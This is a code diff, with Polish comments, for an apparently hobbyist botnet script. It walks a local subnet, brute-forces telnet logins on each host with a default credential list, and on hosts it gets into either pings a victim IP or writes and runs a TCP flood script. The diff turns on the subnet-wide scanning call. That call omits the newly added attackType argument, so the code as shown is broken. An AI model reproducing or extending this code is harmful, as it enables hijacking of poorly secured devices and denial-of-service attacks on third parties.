@@ -10,7 +10,7 @@ import xtelnet
 # from requests import get       ->       można publiczny ip używać    w sumie nie wiem po co xD
 
 
-def telnetConnect(ip_address, victimIP):
+def telnetConnect(ip_address, victimIP, attackType):
     t = xtelnet.session()
     # można zrobić pętlę do wczytywania user credentials z pliku
     users = ['admin', 'root', 'user', '1234', 'administrator']
@@ -19,8 +19,14 @@ def telnetConnect(ip_address, victimIP):
     for user in users:
         for password in passwords:
             t.connect(ip_address, username=user, password=password, p=23, timeout=5)
-            output1 = t.execute('ping ' + victimIP)
-            print(output1)
+            if attackType == 1:
+                output1 = t.execute('ping ' + victimIP)
+                print(output1)
+            if attackType == 2:
+                str1 = open('tcp_flood_code', 'r').read()
+                print(t.execute('touch code.py'))
+                print(t.execute('echo' + '"' + str1 + '"' + '>>' + 'code.py'))
+                print(t.execute('python code.py'))
 
     t.close()
 
@@ -34,7 +40,7 @@ def checkForOtherDevices(ip, victimIP):
     while x < 254:
         current_address = ip + str(x)
         # próbuj połączyć z każdym przez telnet (używając np pliku z loginem i hasłem)
-        # telnetConnect(current_address,victimIP) --> w wątku chyba???                      do odkomentowania!!!
+        telnetConnect(current_address, victimIP)  # --> w wątku chyba???
         x += 1
         # print(current_address)
 
